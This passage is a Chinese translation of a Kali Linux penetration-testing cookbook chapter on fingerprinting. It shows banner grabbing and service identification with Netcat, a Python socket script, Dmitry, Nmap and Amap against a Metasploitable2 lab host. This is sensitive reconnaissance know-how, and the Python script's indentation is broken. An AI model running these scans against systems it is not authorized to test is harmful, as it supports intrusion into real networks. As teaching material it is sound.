# Kali Linux 网络扫描秘籍（三）



# 第四章：指纹识别

> 作者：Justin Hutchens

> 译者：[飞龙](https://github.com/)

> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

识别目标范围上的活动系统，并枚举这些系统上的开放端口之后，重要的是开始收集关于它们和开放端口的服务的信息。 在本章中，我们会讨论用于 Kali Linux 的指纹和服务识别的不同技术。 这些技术将包括特征抓取，服务探测识别，操作系统识别，SNMP 信息收集和防火墙识别。

## 4.1 Netcat 特征抓取

Netcat 是个多用途的网络工具，可以用于在 Kali 中执行多个信息收集和扫描任务。这个秘籍展示了如何使用 Netcat 获取服务特征，以便识别和开放端口相关的服务。

在讲解上述特定秘籍之前，我们应首先了解一些将在本章剩余部分讨论的基本原则。 本章中的每个秘籍都将介绍可用于执行几个特定任务的工具。 这些任务包括特征抓取，服务识别，操作系统识别，SNMP 分析和防火墙识别。 这些任务中的每一个都用于尽可能多地收集目标系统的信息，来快速有效地攻击该系统。

### 准备

为了使用 Netcat 收集服务特征，在客户端设备连接时，你需要拥有运行开放信息的网络服务的远程系统。提供的例子使用了 Metasploitable2 来执行这个任务。配置 Metasploitable2 的更多信息，请参考第一章的“安装 Metasploitable2”秘籍。

在尝试识别远程服务，以及投入大量时间和资源之前，我们应该首先确定该远程服务是否会向我们暴露自己。服务特征包括与远程服务建立连接时立即返回的输出文本。过去用于网络服务的最佳实践是，发现制造商，软件名称，服务类型，甚至服务特征中的版本号。幸运的是，对于渗透测试人员，这些信息对于识别软件中已知的弱点，缺陷和漏洞非常有用。通过仅连接到远程终端服务，我们可以轻易读取服务特征。但是，为了使它是一个有效的信息收集工具，它应该是自动的，这样我们不必手动连接到远程主机上的每个单独的服务。在本章中的特征抓取秘籍中讲解的工具，将完成自动化抓取特征的任务，来识别尽可能多的开放服务。

如果远程服务不愿意暴露运行它的软件和版本，我们需要更多精力来识别服务。 通常，我们可以识别独特的行为，或请求用于精确识别服务的唯一响应。 甚至可以根据响应或行为的微妙变化而识别特定服务的特定版本。 然而，所有这些独特的签名的知识，对任何人来说都很困难。 幸运的是，许多工具已经创建，来向远程服务发送大量探测，来分析这些目标服务的响应和行为。 与之相似，响应变化也可以用于识别在远程服务器或工作站上运行的底层操作系统。 这些工具将在讲解服务识别和操作系统识别的秘籍中讨论。

简单网络管理协议（SNMP）是一种为各种类型的网络设备提供远程管理服务的协议。 SNMP 的管理功能将团体字符串用于验证来执行。 使用默认团队字符串部署设备是非常常见的。 当发生这种情况时，攻击者通常可能远程收集目标设备配置的大量信息，并且甚至在某些情况下重新配置设备。 利用 SNMP 用于信息收集的技术会在讲解 SNMP 分析的秘籍中讨论。

在收集关于潜在目标的信息时，重要的是，还要了解可能影响成功侦查或攻击的任何障碍。 防火墙是一个网络设备或软件，用于选择性限制发往或来自特定目标的网络流量。 防火墙通常配置为防止远程访问特定服务。 防火墙的存在修改了攻击系统和目标之间的流量，有助于尝试识别绕过其过滤器的方法。 识别防火墙设备和服务的技术将在讲解防火墙识别的秘籍中讨论。

### 操作步骤

为了使用 Netcat 抓取服务特征，我们必须与建立远程系统的目标端口建立套接字连接。为了快速理解 Netcat 的用法，以及如何用于该目的，我们可以输出使用方法。这可以使用`-h`选项来完成：

```
root@KaliLinux:~# nc -h 
[v1.10-40] 
connect to somewhere:  nc [-options] hostname port[s] [ports] ... 
listen for inbound:    nc -l -p port [-options] [hostname] [port] 
options:
    -c shell commands as `-e'; use /bin/sh to exec [dangerous!!]   
    -e filename      program to exec after connect [dangerous!!]    
    -b          allow broadcasts   
    -g gateway      source-routing hop point[s], up to 8  
    -G num          source-routing pointer: 4, 8, 12, ...    
    -h          this cruft
    -i secs          delay interval for lines sent, ports scanned        
    -k                      set keepalive option on socket    
    -l          listen mode, for inbound connects   
    -n          numeric-only IP addresses, no DNS   
    -o file            hex dump of traffic  
    -p port          local port number   
    -r          randomize local and remote ports   
    -q secs          quit after EOF on stdin and delay of secs  
    -s addr            local source address  
    -T tos          set Type Of Service  
    -t          answer TELNET negotiation 
    -u          UDP mode 
    -v          verbose [use twice to be more verbose]   
    -w secs          timeout for connects and final net reads    
    -z          zero-I/O mode [used for scanning] 
```

通过查看工具提供的多个选项，我们可以判断出，通过指定选项，IP 地址和端口号，我们就可以创建到所需端口的连接。

```
root@KaliLinux:~# nc -vn 172.16.36.135 22 
(UNKNOWN) [172.16.36.135] 22 (ssh) open 
SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 
^C 
```

在所提供的例子中，创建了到 Metasploitable2 系统`172.16.36.135` 端口 22 的链接。`-v`选项用于提供详细输出，`-n`选项用于不使用 DNS 解析来连接到这个 IP 地址。这里我们可以看到，远程主机返回的特征将服务识别为 SSH，厂商为 OpenSSH，甚至还有精确的版本 4.7。Netcat 维护开放连接，所以读取特征之后，你可以按下`Ctrl + C`来强行关闭连接。

```
root@KaliLinux:~# nc -vn 172.16.36.135 21 
(UNKNOWN) [172.16.36.135] 21 (ftp) open 
220 (vsFTPd 2.3.4) 
^C 
```

通过执行相同主机 21 端口上的相似扫描，我们可以轻易获得所运行 FTP 服务的服务和版本信息。每个情况都暴露了大量实用的信息。了解运行在系统上的服务和版本通常是漏洞的关键指示，这可以用于利用或者入侵系统。

### 工作原理

Netcat 能够住区这些服务的特征，因为当客户端设备连接它们的时候，服务的配置会自己开房这些信息。自我开房服务的和版本的最佳实践在过去常常使用，来确保客户端俩连接到了它们想连接的目标。由于开发者的安全意识变强，这个实践变得越来越不普遍。无论如何，它仍旧对于不良开发者，或者历史遗留服务十分普遍，它们会以服务特征的形式提供大量信息。

## 4.2 Python 套接字特征抓取

Python 的套接字模块可以用于连接运行在远程端口上的网络服务。这个秘籍展示饿了如何使用 Python 套接字来获取服务特征，以便识别目标系统上和开放端口相关的服务。

### 准备

为了使用 Python 套接字收集服务特征，在客户端设备连接时，你需要拥有运行开放信息的网络服务的远程系统。提供的例子使用了 Metasploitable2 来执行这个任务。配置 Metasploitable2 的更多信息，请参考第一章的“安装 Metasploitable2”秘籍。

此外，这一节也需要编写脚本的更多信息，请参考第一章中的“使用文本编辑器 VIM 和 Nano”。

### 操作步骤

使用 Python 交互式解释器，我们可以直接与远程网络设备交互。你可以通过 直接调用 Python 解释器来直接和它交互。这里，你可以导入任何打算使用的特定模块。这里我们导入套接字模块。

```
root@KaliLinux:~# python 
Python 2.7.3 (default, Jan  2 2013, 16:53:07) 
[GCC 4.7.2] on linux2 
Type "help", "copyright", "credits" or "license" for more  information. 
>>> import socket 
>>> bangrab = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
>>> bangrab.connect(("172.16.36.135", 21))
>>> bangrab.recv(4096) '220 (vsFTPd 2.3.4)\r\n'
>>> bangrab.close() 
>>> exit() 
```

在提供的例子中，我们使用名`bangrab`创建了新的套接字。`AF_INET`参数用于表示，套接字使用 IPv4 地址，`SOCK_STREAM`参数用于表示使用 TCP 来传输。一旦套接字创建完毕，可以使用`connect`来初始化连接。例子中。`bangrab`套接字连接 Metasploitable2 远程主机`172.16.36.135`的 21 端口。连接后，`recv`函数可以用于从套接字所连接的服务接收内容。假设有可用信息，它会打印它作为输出。这里，我们可以看到由运行在 Metasploitable2 服务器上的 FTP 服务提供的特征。最后，`close`函数可以用于完全结束与远程服务的连接。如果我们尝试连接不接受连接的服务，Python 解释器会返回错误。

```
root@KaliLinux:~# python 
Python 2.7.3 (default, Jan  2 2013, 16:53:07) 
[GCC 4.7.2] on linux2 
Type "help", "copyright", "credits" or "license" for more  information. 
>>> import socket 
>>> bangrab = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
>>> bangrab.connect(("172.16.36.135", 443)) 
Traceback (most recent call last):  
    File "<stdin>", line 1, in <module>  
    File "/usr/lib/python2.7/socket.py", line 224, in meth    
        return getattr(self._sock,name)(*args) 
socket.error: [Errno 111] Connection refused 
>>> exit() 
```

如果我们尝试连接 Metasploitable2 系统上的 TCP 443 端口，会返回一个错误，表示连接被拒绝。这是因为这个远程端口上没有运行服务。但是，即使当存在服务运行在目标端口时，也不等于就能得到服务的特征。这可以通过与 Metasploitable2 系统的 TCP 80 端口建立连接来看到。

```
root@KaliLinux:~# python 
Python 2.7.3 (default, Jan  2 2013, 16:53:07) 
[GCC 4.7.2] on linux2 
Type "help", "copyright", "credits" or "license" for more information.

>>> import socket 
>>> bangrab = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
>>> bangrab.connect(("172.16.36.135", 80)) 
>>> bangrab.recv(4096) 
```

运行在该系统 80 端口上的服务接受连接，但是不提供服务特征给连接客户端。如果`recv`函数被调用，但是不提供任何数据给接受者，这个函数会被阻塞。为了使用 Python 自动化收集特征，我们必须使用替代方案来识别是否可以抓取到特征，在调用这个函数之前。`select`函数为这个问题提供了便利的解决方案。

```
root@KaliLinux:~# python 
Python 2.7.3 (default, Jan  2 2013, 16:53:07) 
[GCC 4.7.2] on linux2 
Type "help", "copyright", "credits" or "license" for more  information. 
>>> import socket 
>>> import select 
>>> bangrab = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
>>> bangrab.connect(("172.16.36.135", 80)) 
>>> ready = select.select([bangrab],[],[],1) 
>>> if ready[0]: 
...     print bangrab.recv(4096) 
... else: 
...     print "No Banner" 
... No Banner 
```

`select`对象被创建，并赋给了变量`ready`。这个对象被传入了 4 个参数，包括读取列表，写入列表，异常列表，和定义超时秒数的整数值。这里，我们仅仅需要识别套接字什么时候可以读取，所以第二个和第三个参数都是空的。返回值是一个数组，对应三个列表的每一个。我们仅仅对`bangrab`是否有用任何可读内容感兴趣。为了判断是否是这样，我们可以测试数组的第一个值，并且如果值讯在，我们可以从套接字中接受内容。整个过程可以使用 Python 可执行脚本来自动化：

```
#!/usr/bin/python

import socket 
import select 
import sys

if len(sys.argv) != 4:
    print "Usage - ./banner_grab.py [Target-IP] [First Port] [Last     Port]"   
    print "Example - ./banner_grab.py 10.0.0.5 1 100"   
    print "Example will grab banners for TCP ports 1 through 100 on     10.0.0.5"   
    sys.exit()

ip = sys.argv[1] 
start = int(sys.argv[2]) 
end = int(sys.argv[3])
for port in range(start,end):   
try:      
    bangrab = socket.socket(socket.AF_INET, socket.SOCK_STREAM)      
    bangrab.connect((ip, port))      
    ready = select.select([bangrab],[],[],1)      
    if ready[0]:         
        print "TCP Port " + str(port) + " - " + bangrab.recv(4096)         
        bangrab.close()   
except: 
    pass
```

在提供的脚本中，三个参数作为输入接受。第一个参数包含用于测试服务特征的 IP 地址。第二个参数指明了被扫描的端口范围的第一个端口，第三个和最后一个参数指明了最后一个端口。执行过程中，这个脚本会使用 Python 套接字来连接所有远程系统的范围内的端口值。并且会收集和打印所有识别出的服务特征。这个脚本可以通过修改文件权限之后直接从所在目录中调用来执行：

```
root@KaliLinux:~# chmod 777 banner_grab.py 
root@KaliLinux:~# ./banner_grab.py 172.16.36.135 1 65535 

TCP Port 21 - 220 (vsFTPd 2.3.4)

TCP Port 22 - SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1

TCP Port 23 - ???? ??#??' 
TCP Port 25 - 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)

TCP Port 512 - Where are you?

TCP Port 514 - 
TCP Port 1524 - root@metasploitable:/# 

TCP Port 2121 - 220 ProFTPD 1.3.1 Server (Debian)  
[::ffff:172.16.36.135]

TCP Port 3306 - > 
5.0.51a-3ubuntu5?bo,(${c\,#934JYb^4'fM 
TCP Port 5900 - RFB 003.003

TCP Port 6667 - :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up  your hostname... 
:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your  hostname; using your IP address instead

TCP Port 6697 - :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up  your hostname...

```

### 工作原理

这个秘籍中引入的 Python 脚本的原理是使用套接字库。脚本遍历每个指定的目标端口地址，并尝试与特定端口初始化 TCP 连接。如果建立了连接并接受到来自目标服务的特征，特征之后会打印在脚本的输出中。如果连接不能与远程端口建立，脚本之后会移动到循环汇总的下一个端口地址。与之相似，如果建立了连接，但是没有返回任何特征，连接会被关闭，并且脚本会继续扫描循环内的下一个值。

## 4.3 Dmitry 特征抓取

Dmitry 是个简单但高效的工具，可以用于连接运行在远程端口上的网络服务。这个秘籍真实了如何使用 Dmitry 扫描来获取服务特征，以便识别和开放端口相关的服务。

### 准备

为了使用 Dmitry 收集服务特征，在客户端设备连接时，你需要拥有运行开放信息的网络服务的远程系统。提供的例子使用了 Metasploitable2 来执行这个任务。配置 Metasploitable2 的更多信息，请参考第一章的“安装 Metasploitable2”秘籍。

### 工作原理

就像在这本书的端口扫描秘籍中讨论的那样 Dmitry 可以用于对 150 个常用服务的端口执行快速的 TCP 端口扫描。这可以使用`-p`选项来执行：

```
root@KaliLinux:~# dmitry -p 172.16.36.135 
Deepmagic Information Gathering Tool 
"There be some deep magic going on"

ERROR: Unable to locate Host Name for 172.16.36.135 
Continuing with limited modules 
HostIP:172.16.36.135 HostName:

Gathered TCP Port information for 172.16.36.135 
--------------------------------

 Port     State
 
21/tcp     open 
22/tcp     open 
23/tcp     open 
25/tcp     open 
53/tcp     open 
80/tcp     open 
111/tcp        open 
139/tcp        open

Portscan Finished: Scanned 150 ports, 141 ports were in state closed 
```

这个端口扫描选项是必须的，以便使用 Dmitry 执行特征抓取。也可以在尝试连接这 150 个端口时，让 Dmitry 抓取任何可用的特征。这可以使用`-b`选项和`-p`选项来完成。

```
root@KaliLinux:~# dmitry -pb 172.16.36.135 
Deepmagic Information Gathering Tool
"There be some deep magic going on"

ERROR: Unable to locate 
Host Name for 172.16.36.135 Continuing with limited modules 
HostIP:172.16.36.135 HostName:

Gathered TCP Port information for 172.16.36.135 
--------------------------------

 Port     State
 
21/tcp     open 
>> 220 (vsFTPd 2.3.4)

22/tcp     open 
>> SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1

23/tcp     open 
>> ???? ??#??' 
25/tcp     open 
>> 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)

53/tcp     open 
80/tcp     open 
111/tcp        open 
139/tcp        open

Portscan Finished: Scanned 150 ports, 141 ports were in state closed
```

### 工作原理

Dmitry 是个非常简单的命令工具，可以以少量开销执行特征抓取任务。比起指定需要尝试特征抓取的端口，Dmitry 可以自动化这个过程，通过仅仅在小型的预定义和常用端口集合中尝试特征抓取。来自运行在这些端口地址的特征之后会在脚本的终端输出中显示。

## 4.4 Nmap NSE 特征抓取

Nmap 拥有集成的 Nmap 脚本引擎（NSE），可以用于从运行在远程端口的网络服务中读取特征。这个秘籍展示了如何使用 Nmap NSE 来获取服务特征，以便识别与目标系统的开放端口相关的服务。

### 准备

为了使用 Nmap NSE 收集服务特征，在客户端设备连接时，你需要拥有运行开放信息的网络服务的远程系统。提供的例子使用了 Metasploitable2 来执行这个任务。配置 Metasploitable2 的更多信息，请参考第一章的“安装 Metasploitable2”秘籍。

### 操作步骤

Nmap NSE 脚本可以在 Nmap 中使用`--script`选项，之后指定脚本名称来调用。对于这个特定的脚本，会使用`-sT`全连接扫描，因为服务特征只能通过建立 TCP 全连接在收集。这个脚本会在通过 Nmap 请求扫描的相同端口上使用。

```
root@KaliLinux:~# nmap -sT 172.16.36.135 -p 22 --script=banner

Starting Nmap 6.25 ( http://nmap.org ) at 2013-12-19 04:56 EST 
Nmap scan report for 172.16.36.135 
Host is up (0.00036s latency). 
PORT   STATE SERVICE 
22/tcp open  ssh 
|_banner: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 
MAC Address: 00:0C:29:3D:84:32 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds 
```

在提供的例子中，扫描了 Metasploitable2 系统的端口 22。除了表明端口打开之外，Nmap 也使用特征脚本来收集与该端口相关的服务特征。可以使用`--notation`，在端口范围内使用相同机制。

```
root@KaliLinux:~# nmap -sT 172.16.36.135 -p 1-100 --script=banner

Starting Nmap 6.25 ( http://nmap.org ) at 2013-12-19 04:56 EST
Nmap scan report for 172.16.36.135 
Host is up (0.0024s latency). 
Not shown: 94 closed ports 
PORT   STATE SERVICE 
21/tcp open  ftp 
|_banner: 220 (vsFTPd 2.3.4) 
22/tcp open  ssh 
|_banner: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 
23/tcp open  telnet 
|_banner: \xFF\xFD\x18\xFF\xFD \xFF\xFD#\xFF\xFD' 
25/tcp open  smtp 
|_banner: 220 metasploitable.localdomain ESMTP Postfix (Ubuntu) 
53/tcp open  domain 
80/tcp open  http 
MAC Address: 00:0C:29:3D:84:32 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 10.26 seconds
```

### 工作原理

另一个用于执行特征抓取的选择就是使用 Nmap NSE 脚本。这可以以两种方式有效简化信息收集过程：首先，由于 Nmap 已经存在于你的工具库中，经常用于目标和服务探索；其次，因为特征抓取过程可以和这些扫描一起执行。 带有附加脚本选项和特征参数的 TCP 连接扫描可以完成服务枚举和特征收集的任务。

## 4.5 Amap 特征抓取

Amap 是个应用映射工具，可以用于从运行在远程端口上的网络设备中读取特征。这个秘籍展示了如何使用 Amap 来获取服务特征，以便识别和目标系统上的开放端口相关的服务。

### 准备

为了使用 Amap 收集服务特征，在客户端设备连接时，你需要拥有运行开放信息的网络服务的远程系统。提供的例子使用了 Metasploitable2 来执行这个任务。配置 Metasploitable2 的更多信息，请参考第一章的“安装 Metasploitable2”秘籍。

### 操作步骤

Amap 中的`-B`选项可以用于以特征模式运行应用。这会使其收集特定 IP 地址和独舞端口的特征。Amap 可以通过指定远程 IP 地址和服务号码来收集单个服务的特征。

```
root@KaliLinux:~# amap -B 172.16.36.135 21 
amap v5.4 (www.thc.org/thc-amap) started at 2013-12-19 05:04:58 -  BANNER mode

Banner on 172.16.36.135:21/tcp : 220 (vsFTPd 2.3.4)\r\n

amap v5.4 finished at 2013-12-19 05:04:58 
```

这个例子中，Amap 从 Metasploitable2 系统`172.16.36.135`的 21 端口抓取了服务特征。这个命令也可以修改来扫描端口的序列范围。为了在所有可能的 TCP 端口上执行扫描，需要奥妙所有可能的端口地址。定义了来源和目标端口地址的 TCP 头部部分是 16 位长，每一位可以为值 1 或者 0。所以一共有`2 **16`或 65536 个 TCP 端口地址。为了扫描所有可能的地址空间，必须提供 1 到 65535 的 范围。

```
root@KaliLinux:~# amap -B 172.16.36.135 1-65535 
amap v5.4 (www.thc.org/thc-amap) started at 2014-01-24 15:54:28 -  BANNER mode

Banner on 172.16.36.135:22/tcp : SSH-2.0-OpenSSH_4.7p1 Debian- 8ubuntu1\n 
Banner on 172.16.36.135:21/tcp : 220 (vsFTPd 2.3.4)\r\n 
Banner on 172.16.36.135:25/tcp : 220 metasploitable.localdomain  ESMTP Postfix (Ubuntu)\r\n 
Banner on 172.16.36.135:23/tcp :  #' 
Banner on 172.16.36.135:512/tcp : Where are you?\n 
Banner on 172.16.36.135:1524/tcp : root@metasploitable/# 
Banner on 172.16.36.135:2121/tcp : 220 ProFTPD 1.3.1 Server  (Debian) [ffff172.16.36.135]\r\n 
Banner on 172.16.36.135:3306/tcp : >\n5.0.51a- 3ubuntu5dJ$t?xdj,fCYxm=)Q=~$5 
Banner on 172.16.36.135:5900/tcp : RFB 003.003\n 
Banner on 172.16.36.135:6667/tcp : irc.Metasploitable.LAN NOTICE  AUTH *** Looking up your hostname...\r\n
Banner on 172.16.36.135:6697/tcp : irc.Metasploitable.LAN NOTICE  AUTH *** Looking up your hostname...\r\n

amap v5.4 finished at 2014-01-24 15:54:35
```

Amap 所产生的标准输出提供了一些无用和冗余的信息，可以从输出中去掉。尤其是，移除扫描元数据（`Banner`）以及在整个扫描中都相同的 IP 地址会十分有用。为了移除扫描元数据，我们必须用`grep`搜索输出中的某个短语，它对特定输出项目唯一，并且在扫描元数据中不存在。这里，我们可以`grep`搜索单词`on`。

```
root@KaliLinux:~# amap -B 172.16.36.135 1-65535 | grep "on" 
Banner on 172.16.36.135:22/tcp : SSH-2.0-OpenSSH_4.7p1 Debian- 8ubuntu1\n 
Banner on 172.16.36.135:23/tcp :  #' 
Banner on 172.16.36.135:21/tcp : 220 (vsFTPd 2.3.4)\r\n 
Banner on 172.16.36.135:25/tcp : 220 metasploitable.localdomain  ESMTP Postfix (Ubuntu)\r\n 
Banner on 172.16.36.135:512/tcp : Where are you?\n 
Banner on 172.16.36.135:1524/tcp : root@metasploitable/# 
Banner on 172.16.36.135:2121/tcp : 220 ProFTPD 1.3.1 Server  (Debian) [ffff172.16.36.135]\r\n 
Banner on 172.16.36.135:3306/tcp : >\n5.0.51a- 3ubuntu5\tr>}{pDAY,|$948[D~q<u[ 
Banner on 172.16.36.135:5900/tcp : RFB 003.003\n 
Banner on 172.16.36.135:6697/tcp : irc.Metasploitable.LAN NOTICE  AUTH *** Looking up your hostname...\r\n 
Banner on 172.16.36.135:6667/tcp : irc.Metasploitable.LAN NOTICE  AUTH *** Looking up your hostname...\r\n 
```

我们可以通过使用冒号分隔符来分割每行输出，并只保留字段 2 到 5，将`Banner on`短语，以及重复 IP 地址从输出中移除。

```
root@KaliLinux:~# amap -B 172.16.36.135 1-65535 | grep "on" | cut  -d ":" -f 2-5 
21/tcp : 220 (vsFTPd 2.3.4)\r\n
22/tcp : SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1\n 
1524/tcp : root@metasploitable/# 
25/tcp : 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)\r\n
23/tcp :  #' 
512/tcp : Where are you?\n
2121/tcp : 220 ProFTPD 1.3.1 Server (Debian)  [ffff172.16.36.135]\r\n
3306/tcp : >\n5.0.51a-3ubuntu5\nqjAClv0(,v>q?&?J7qW>n 
5900/tcp : RFB 003.003\n 
6667/tcp : irc.Metasploitable.LAN NOTICE AUTH *** Looking up your  hostname...\r\n
6697/tcp : irc.Metasploitable.LAN NOTICE AUTH *** Looking up your  hostname...\r\n

```

### 工作原理

Amap 用于完成特征抓取任务的底层原理和其它所讨论的工具一样。Amap 循环遍历目标端口地址的列表，尝试和每个端口建立连接，之后接收任何返回的通过与服务之间的连接发送的特征。

## 4.6 Nmap 服务识别

虽然特征抓取是非常有利的信息来源，服务特征中的版本发现越来越不重要。Nmap 拥有服务识别功能，不仅仅是简单的特征抓取机制。这个秘籍展示了如何使用 Nmap 基于探测响应的分析执行服务识别。

### 准备

为了使用 Nmap 执行服务识别，你需要拥有运行可被探测的网络服务的远程系统。提供的例子使用了 Metasploitable2 来执行这个任务。配置 Metasploitable2 的更多信息，请参考第一章的“安装 Metasploitable2”秘籍。

### 操作步骤

为了理解 Nmap 服务是被功能的高效性，我们应该考虑不提供自我开放的服务特征的服务。通过使用 Netcat 连接 Metasploitable2 系统的 TCP 80 端口（这个技巧在这一章的“Netcat 特征抓取”秘籍中讨论过了），我们可以看到，仅仅通过建立 TCP 连接，不能得到任何服务特征。

```
root@KaliLinux:~# nc -nv 172.16.36.135 80 
(UNKNOWN) [172.16.36.135] 80 (http) open 
^C
```

之后，为了在相同端口上执行 Nmap 扫描，我们可以使用`-sV`选项，并且指定 IP 和端口。

```
root@KaliLinux:~# nmap 172.16.36.135 -p 80 -sV

Starting Nmap 6.25 ( http://nmap.org ) at 2013-12-19 05:20 EST 
Nmap scan report for 172.16.36.135 
Host is up (0.00035s latency). 
PORT   STATE SERVICE VERSION 
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2) 
MAC Address: 00:0C:29:3D:84:32 (VMware)

Service detection performed. Please report any incorrect results  at http://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 6.18 seconds
```

你可以看到在这个示例中，Nmap 能够识别该服务，厂商，以及产品的特定版本。这个服务识别功能也可以用于对特定端口列表使用。这在 Nmap 中并不需要指定端口，Nmap 会扫描 1000 个常用端口，并且尝试识别所有识别出来的监听服务。

```
root@KaliLinux:~# nmap 172.16.36.135 -sV

Starting Nmap 6.25 ( http://nmap.org ) at 2013-12-19 05:20 EST 
Nmap scan report for 172.16.36.135 
Host is up (0.00032s latency). 
Not shown: 977 closed ports 
PORT     STATE SERVICE     VERSION 
21/tcp   open  ftp         vsftpd 2.3.4 
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol  2.0) 
23/tcp   open  telnet      Linux telnetd 
25/tcp   open  smtp        Postfix smtpd 
53/tcp   open  domain      ISC BIND 9.4.2 
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2) 
111/tcp  open  rpcbind     2 (RPC #100000) 
139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP) 
445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP) 
512/tcp  open  exec        netkit-rsh rexecd 
513/tcp  open  login? 
514/tcp  open  tcpwrapped
1099/tcp open  rmiregistry GNU Classpath grmiregistry 
1524/tcp open  ingreslock? 
2049/tcp open  nfs         2-4 (RPC #100003) 
2121/tcp open  ftp         ProFTPD 1.3.1 
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5 
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7 
5900/tcp open  vnc         VNC (protocol 3.3) 
6000/tcp open  X11         (access denied) 
6667/tcp open  irc         Unreal ircd 
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3) 
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1 MAC Address: 00:0C:29:3D:84:32 (VMware) 
Service Info: Hosts:  metasploitable.localdomain, localhost,  irc.Metasploitable.LAN; OSs: Unix, Linux; CPE:  cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results  at http://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 161.49 seconds
```

### 工作原理

Nmap 服务识别会发送一系列复杂的探测请求，之后分析这些请求的响应，尝试基于服务特定的签名和预期行为，来识别服务。此外，你可以看到 Nmap 服务识别输出的底部，Nmap 依赖于用户的反馈，以便确保服务签名保持可靠。

## 4.7 Amap 服务识别

Amap 是 Nmap 的近亲，尤其为识别网络服务而设计。这个秘籍中，我们会探索如何使用 Amap 来执行服务识别。

### 准备

为了使用 Amap 执行服务识别，你需要拥有运行可被探测的网络服务的远程系统。提供的例子使用了 Metasploitable2 来执行这个任务。配置 Metasploitable2 的更多信息，请参考第一章的“安装 Metasploitable2”秘籍。

### 操作步骤

为了在单一端口上执行服务识别，以特定的 IP 地址和端口号来运行 Amap。

```
root@KaliLinux:~# amap 172.16.36.135 80 
amap v5.4 (www.thc.org/thc-amap) started at 2013-12-19 05:26:13 -  APPLICATION MAPPING mode

Protocol on 172.16.36.135:80/tcp matches http
Protocol on 172.16.36.135:80/tcp matches http-apache-2

Unidentified ports: none.

amap v5.4 finished at 2013-12-19 05:26:19
```

Amap 也可以使用破折号记法扫描端口号码序列。为了这样你工作，以特定 IP 地址和端口范围来执行`amap`，端口范围由范围的第一个端口号，破折号，和范围的最后一个端口号指定。

```
root@KaliLinux:~# amap 172.16.36.135 20-30 
amap v5.4 (www.thc.org/thc-amap) started at 2013-12-19 05:28:16 -  APPLICATION MAPPING mode

Protocol on 172.16.36.135:25/tcp matches smtp 
Protocol on 172.16.36.135:21/tcp matches ftp 
Protocol on 172.16.36.135:25/tcp matches nntp 
Protocol on 172.16.36.135:22/tcp matches ssh 
Protocol on 172.16.36.135:22/tcp matches ssh-openssh 
Protocol on 172.16.36.135:23/tcp matches telnet

Unidentified ports: 172.16.36.135:20/tcp 172.16.36.135:24/tcp  172.16.36.135:26/tcp 172.16.36.135:27/tcp 172.16.36.135:28/tcp  172.16.36.135:29/tcp 172.16.36.135:30/tcp (total 7).

amap v5.4 finished at 2013-12-19 05:28:17

```

除了识别任何服务，它也能够在输出末尾生产列表，表明任何未识别的端口。这个列表不仅仅包含运行不能识别的服务的开放端口，也包含所有扫描过的关闭端口。但是这个输出仅在扫描了 10 个端口时易于管理，当扫描更多端口范围之后会变得十分麻烦。为了去掉未识别端口的信息，可以使用`-q`选项：

```
root@KaliLinux:~# amap 172.16.36.135 1-100 -q 
amap v5.4 (www.thc.org/thc-amap) started at 2013-12-19 05:29:27 -  APPLICATION MAPPING mode

Protocol on 172.16.36.135:21/tcp matches ftp 
Protocol on 172.16.36.135:25/tcp matches smtp 
Protocol on 172.16.36.135:22/tcp matches ssh 
Protocol on 172.16.36.135:22/tcp matches ssh-openssh 
Protocol on 172.16.36.135:23/tcp matches telnet 
Protocol on 172.16.36.135:80/tcp matches http 
Protocol on 172.16.36.135:80/tcp matches http-apache-2 
Protocol on 172.16.36.135:25/tcp matches nntp 
Protocol on 172.16.36.135:53/tcp matches dns

amap v5.4 finished at 2013-12-19 05:29:39 
```

要注意，Amap 会指明常规匹配和更加特定的签名。在这个例子中，运行在端口 22 的服务被识别为匹配 SSH 签名，也匹配更加具体的 OpenSSH 签名。将服务签名和服务特征展示在一起很有意义。特征可以使用`-b`选项，附加到和每个端口相关的信息后面：

```
root@KaliLinux:~# amap 172.16.36.135 1-100 -qb 
amap v5.4 (www.thc.org/thc-amap) started at 2013-12-19 05:32:11 -  APPLICATION MAPPING mode

Protocol on 172.16.36.135:21/tcp matches ftp - banner: 220 (vsFTPd  2.3.4)\r\n530 Please login with USER and PASS.\r\n 
Protocol on 172.16.36.135:22/tcp matches ssh - banner: SSH-2.0- OpenSSH_4.7p1 Debian-8ubuntu1\n 
Protocol on 172.16.36.135:22/tcp matches ssh-openssh - banner:  SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1\n 
Protocol on 172.16.36.135:25/tcp matches smtp - banner: 220  metasploitable.localdomain ESMTP Postfix (Ubuntu)\r\n221 2.7.0  Error I can break rules, too. Goodbye.\r\n 
Protocol on 172.16.36.135:23/tcp matches telnet - banner:  #'
